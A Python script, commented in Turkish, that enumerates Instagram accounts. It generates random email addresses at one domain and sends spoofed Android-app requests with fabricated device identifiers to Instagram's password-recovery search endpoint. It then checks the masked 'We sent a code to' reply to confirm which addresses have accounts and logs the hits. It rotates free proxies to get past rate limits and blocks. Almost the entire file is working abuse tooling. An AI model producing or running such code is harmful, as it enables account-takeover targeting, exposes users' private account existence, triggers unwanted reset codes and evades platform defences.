import os
import random
import re
import string
import time
import uuid
import secrets
import json
from concurrent.futures import ThreadPoolExecutor
from threading import local, Lock
import httpx
from fp.fp import FreeProxy

# --- KONFİGÜRASYON ---
INPUT_FILE = "okinsta.txt"
SCANNED_FILE = "tarananlar.txt"
RESPONSE_TXT_FILE = "response.txt"
TARGET_CYCLE_LIMIT = 360

# Global Değişkenler
scanned_database = set()
lock = Lock()
stop_flag = False
active_proxy = None  # O an kullanılan aktif proxy

# --- THREAD-LOCAL VE OTURUM YÖNETİMİ ---
thread_local = local()

def test_proxy(proxy_str):
    """Proxy'nin çalışıp çalışmadığını test eder"""
    try:
        res = httpx.get("https://httpbin.org/ip", proxies=proxy_str, timeout=4)
        if res.status_code == 200:
            return True
    except:
        pass
    return False

def get_fresh_working_proxy():
    """Web'den taze ve canlı proxy taranır"""
    print("\n🔍 [PROXY ROTASYON] Web'den taze ve canlı proxy taranıyor...")
    for _ in range(15):
        try:
            p = FreeProxy(https=True).get()
            if p and test_proxy(p):
                print(f"✅ [AKTİF PROXY BULUNDU] ---> {p}")
                return p
        except Exception:
            pass
    print("⚠️ Anlık canlı proxy bulunamadı, tekrar deneniyor...")
    time.sleep(2)
    return get_fresh_working_proxy()

# --- TARANANLARI YÜKLE ---
if os.path.exists(SCANNED_FILE):
    with open(SCANNED_FILE, "r", encoding="utf-8") as f:
        for line in f:
            scanned_database.add(line.strip().lower())
    print(f"✅ {len(scanned_database)} adet eski taranan kayıt yüklendi.")


def rotate_proxy_on_error(reason_msg=""):
    global active_proxy, stop_flag
    print(f"\n🔄 [PROXY ROTASYON] {reason_msg} Yeni çalışan proxy aranıyor...")
    active_proxy = get_fresh_working_proxy()
    stop_flag = False


def verify_masked_email(full_email, response_text):
    match = re.search(r"We sent a code to\s+([^\s<>\"]+)", response_text)
    if not match:
        return False
    masked_email = match.group(1).rstrip(".,;")
    if masked_email.lower() == full_email.lower():
        return True
    try:
        m_local, m_domain = masked_email.split("@")
        f_local, f_domain = full_email.split("@")
    except ValueError:
        return False
    if not m_local or not f_local:
        return False
    if m_local[0].lower() != f_local[0].lower():
        return False
    if m_local[-1] != "*" and m_local[-1].lower() != f_local[-1].lower():
        return False
    if "*" in m_domain:
        m_domain_prefix = m_domain.split("*")[0]
        m_domain_suffix = m_domain.split(".")[-1]
        if not f_domain.startswith(m_domain_prefix) or not f_domain.endswith(m_domain_suffix):
            return False
    else:
        if m_domain.lower() != f_domain.lower():
            return False
    return True


def extract_encrypted_context(response_text):
    match = re.search(r'(AX[a-zA-Z0-9_\-]{100,})', response_text)
    if match:
        return match.group(1)
    return ""


def check_reset(email):
    global active_proxy, stop_flag
    if not active_proxy:
        active_proxy = get_fresh_working_proxy()

    # httpx client'a aktif proxy'yi entegre ediyoruz
    client = httpx.Client(http2=True, timeout=30.0, proxies=active_proxy)
    host = random.choice(["i.instagram.com", "b.i.instagram.com"])
    bloks_version = "81afa1a45e1df628a85f745314cd89f1bc4e518dd0a4bf62951250fce559ed05"

    def _headers(friendly_name):
        return {
            "accept-language": "en-US",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ig-intended-user-id": "0",
            "priority": "u=3",
            "x-bloks-is-layout-rtl": "false",
            "x-bloks-prism-button-version": "INDIGO_PRIMARY_BORDERED_SECONDARY",
            "x-bloks-prism-colors-enabled": "true",
            "x-bloks-extended-palette-gray": "true",
            "x-bloks-extended-palette-indigo": "true",
            "x-bloks-prism-extended-palette-polish-enabled": "false",
            "x-bloks-prism-extended-palette-red": "true",
            "x-bloks-prism-extended-palette-rest-of-colors": "true",
            "x-bloks-prism-font-enabled": "true",
            "x-bloks-prism-indigo-link-version": "1",
            "x-bloks-version-id": bloks_version,
            "x-fb-client-ip": "True",
            "x-fb-connection-type": "WIFI",
            "x-fb-friendly-name": f"IgApi: {friendly_name}/",
            "x-fb-request-analytics-tags": '{"network_tags":{"product":"567067343352427","surface":"undefined","request_category":"api","purpose":"fetch","retry_attempt":"0"}}',
            "x-fb-server-cluster": "True",
            "x-ig-android-id": f"android-{str(uuid.uuid4().hex)[:16]}",
            "x-ig-app-id": "567067343352427",
            "x-ig-app-locale": "en_US",
            "x-ig-bandwidth-speed-kbps": "7060.000",
            "x-ig-bandwidth-totalbytes-b": "13597412",
            "x-ig-bandwidth-totaltime-ms": "1586",
            "x-ig-client-endpoint": "IgCdsScreenNavigationLoggerModule:com.bloks.www.caa.ar.search",
            "x-ig-capabilities": "3brTv10=",
            "x-ig-connection-type": "WIFI",
            "x-ig-device-id": f"{str(uuid.uuid4())}",
            "x-ig-device-locale": "en_US",
            "x-ig-family-device-id": f"{str(uuid.uuid4())}",
            "x-ig-is-foldable": "false",
            "x-ig-mapped-locale": "en_US",
            "x-ig-timezone-offset": "19800",
            "x-ig-www-claim": "0",
            "x-pigeon-rawclienttime": f"{int(time.time())}.030",
            "x-pigeon-session-id": f"UFS-{str(uuid.uuid4())}-1",
            "x-tigon-is-retry": "False",
            "user-agent": "Instagram 440.0.0.32.73 Android (30/11; 480dpi; 1080x2340; OnePlus; LE2110; starlte; qcom; en_US; 348123456)",
            "x-fb-conn-uuid-client": f"{str(uuid.uuid4())}",
            "x-fb-http-engine": "Tigon/MNS/TCP",
        }

    def _bk_context():
        return json.dumps({
            "bloks_version": bloks_version,
            "styles_id": "instagram",
            "theme_params": [{"value": ["three_neutral_gray"], "design_system_name": "XMDS"}],
        }, separators=(",", ":"))

    device_id = f"android-{str(uuid.uuid4().hex)[:16]}"
    family_device_id = str(uuid.uuid4())
    waterfall_id = str(uuid.uuid4())
    event_request_id = str(uuid.uuid4())
    aac_init_timestamp = int(time.time())
    aacjid = str(uuid.uuid4())
    aaccs = "AW" + secrets.token_urlsafe(32).replace("=", "").replace("+", "").replace("/", "")

    params = {
        "client_input_params": {
            "blocked_uids": [],
            "aac": json.dumps({
                "aac_init_timestamp": aac_init_timestamp,
                "aacjid": aacjid,
                "aaccs": aaccs,
            }),
            "flash_call_permissions_status": {
                "READ_PHONE_STATE": "GRANTED",
                "READ_CALL_LOG": "DENIED",
                "ANSWER_PHONE_CALLS": "DENIED",
            },
            "was_headers_prefill_available": 0,
            "network_bssid": None,
            "sfdid": "",
            "fetched_email_token_list": {},
            "search_query": email,
            "auth_secure_device_id": "",
            "ig_oauth_token": [],
            "cloud_trust_token": None,
            "was_headers_prefill_used": 0,
            "sso_accounts_auth_data": [],
            "encrypted_msisdn": "",
            "device_network_info": {
                "default_subscription_info": {
                    "network_type": 13, "is_data_roaming": 1, "is_esim": 0, "is_gsm_roaming": 0,
                    "is_sim_sms_capable": None, "is_mobile_data_enabled": 1, "sim_carrier_id": -1,
                    "sim_carrier_id_name": None, "sim_state": 5, "sim_operator": "310005",
                    "sim_operator_name": "Verizon Wireless", "signal_strength": None,
                    "group_id_level_1": None, "network_operator": "310005",
                },
                "sim_count": 1, "is_wifi": 1, "is_airplane_mode": 0,
                "is_active_network_cellular": 0, "is_device_sms_capable": 1,
                "active_subscriptions_info": [{
                    "network_type": 13, "is_data_roaming": 1, "is_esim": 0, "is_gsm_roaming": 0,
                    "is_sim_sms_capable": None, "is_mobile_data_enabled": 1, "sim_carrier_id": -1,
                    "sim_carrier_id_name": None, "sim_state": 5, "sim_operator": "310005",
                    "sim_operator_name": "Verizon Wireless", "signal_strength": None,
                    "group_id_level_1": None, "network_operator": "310005",
                }],
            },
            "text_input_id": "4cbr8a:53",
            "zero_balance_state": None,
            "android_build_type": "release",
            "accounts_list": [],
            "is_oauth_without_permission": 0,
            "ig_android_qe_device_id": str(uuid.uuid4()),
            "gms_incoming_call_retriever_eligibility": "not_eligible",
            "search_screen_type": "email_or_username",
            "is_whatsapp_installed": 0,
            "lois_settings": {"lois_token": ""},
            "ig_vetted_device_nonce": None,
            "headers_infra_flow_id": "",
            "fetched_email_list": [],
        },
        "server_params": {
            "event_request_id": event_request_id,
            "is_from_logged_out": 1,
            "layered_homepage_experiment_group": "Deploy: Not in Experiment",
            "device_id": device_id,
            "login_surface": "login_home",
            "waterfall_id": waterfall_id,
            "INTERNAL__latency_qpl_instance_id": 26256860200107,
            "is_platform_login": 0,
            "context_data": "",
            "login_entry_point": "logged_out",
            "INTERNAL__latency_qpl_marker_id": 36707139,
            "family_device_id": family_device_id,
            "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
            "access_flow_version": "pre_mt_behavior",
            "is_from_logged_in_switcher": 0,
            "qe_device_id": str(uuid.uuid4()),
        },
    }

    payload = {
        "params": json.dumps(params, separators=(",", ":")),
        "bk_client_context": _bk_context(),
        "bloks_versioning_id": bloks_version,
    }

    try:
        print(f"📡 [İSTEK] Proxy: {active_proxy} | Hedef: {email}")
        response = client.post(
            f"https://{host}/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
            data=payload,
            headers=_headers("bloks/async_action/com.bloks.www.caa.ar.search.async"),
        )

        response_text = response.text
        clean_response = response_text.replace("/", "").replace("\\", "")
        
        # Engel veya rate-limit kontrolü
        if response.status_code in (403, 429) or "please wait" in clean_response.lower() or "feedback_required" in clean_response.lower():
            print(f"🚨 [PROXİ PATLADI / ENGEL] HTTP Status: {response.status_code}")
            with lock:
                if not stop_flag:
                    stop_flag = True
            return "error"

        if "We sent a code to" in clean_response:
            is_verified = verify_masked_email(email, clean_response)
            print(f"🔎 [E-POSTA DOĞRULAMA EŞLEŞMESİ]: {is_verified}")
            if is_verified:
                print(f"🟢 [KESİN HESAP BULUNDU] {email}")
                with lock:
                    with open(INPUT_FILE, "a", encoding="utf-8") as f:
                        f.write(f"{email}\n")
                return "good"
            else:
                return "bad"
        else:
            return "bad"

    except Exception as e:
        print(f"❌ [BAĞLANTI HATASI] Proxy düştü veya zaman aşımı: {e}")
        with lock:
            if not stop_flag:
                stop_flag = True
        return "error"
    finally:
        client.close()


def auditor_worker(username, target_domain):
    global stop_flag
    if stop_flag:
        return False, None

    full_email = f"{username}@{target_domain}"
    time.sleep(random.uniform(0.3, 0.9))
    
    result = check_reset(full_email)
    
    if result == "error":
        return False, None
        
    return True, username


def main():
    global stop_flag
    print("\n--- INSTAGRAM KESİN DOĞRULAMALI TARAMA MODÜLÜ ---")
    
    target_domain = "hi2.in"
    prefix = ""
    suffix = ""
    random_len = 7

    while True:
        if not os.path.exists(INPUT_FILE):
            with open(INPUT_FILE, "w", encoding="utf-8") as f:
                pass

        stop_flag = False
        instagram_scanned_in_cycle = 0
        print(f"\n🔎 Tarama başlatıldı... (Her {TARGET_CYCLE_LIMIT} sorguda veya hata durumunda IP yenilenecek)")

        while not stop_flag and instagram_scanned_in_cycle < TARGET_CYCLE_LIMIT:
            found_users = []
            batch_target_count = min(50, TARGET_CYCLE_LIMIT - instagram_scanned_in_cycle)
            
            while len(found_users) < batch_target_count and not stop_flag:
                random_part = ''.join(random.choice(string.ascii_lowercase) for _ in range(random_len))
                u = (prefix + random_part + suffix).lower()
                if u not in scanned_database:
                    found_users.append(u)

            if not found_users or stop_flag:
                break

            batch_tested = []

            def run_worker(u):
                success, scanned_u = auditor_worker(u, target_domain)
                if scanned_u:
                    with lock:
                        batch_tested.append(scanned_u)

            with ThreadPoolExecutor(max_workers=3) as executor:
                executor.map(run_worker, found_users)

            if batch_tested:
                with lock:
                    with open(SCANNED_FILE, "a", encoding="utf-8") as f:
                        for u in batch_tested:
                            f.write(u + "\n")
                            scanned_database.add(u)
                    instagram_scanned_in_cycle += len(batch_tested)
                    print(f"📈 [İlerleme] Bu proxy ile taranan: {instagram_scanned_in_cycle}/{TARGET_CYCLE_LIMIT}")

            if stop_flag:
                print("\n🛑 Proxy düştü veya engel alındı. Yeni canlı proxy seçiliyor...")
                rotate_proxy_on_error("Hata/Engel Nedeniyle;")

        if instagram_scanned_in_cycle >= TARGET_CYCLE_LIMIT:
            print(f"\n🎯 {TARGET_CYCLE_LIMIT} sorgu sınırına ulaşıldы! Güvenlik için yeni proxy'ye geçiliyor...")
            rotate_proxy_on_error("Sorgu Limiti Dolduğu İçin;")

        print(f"\n🔄 Döngü yenileniyor...\n" + "="*40)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram kullanıcı tarafından durduruldu.")
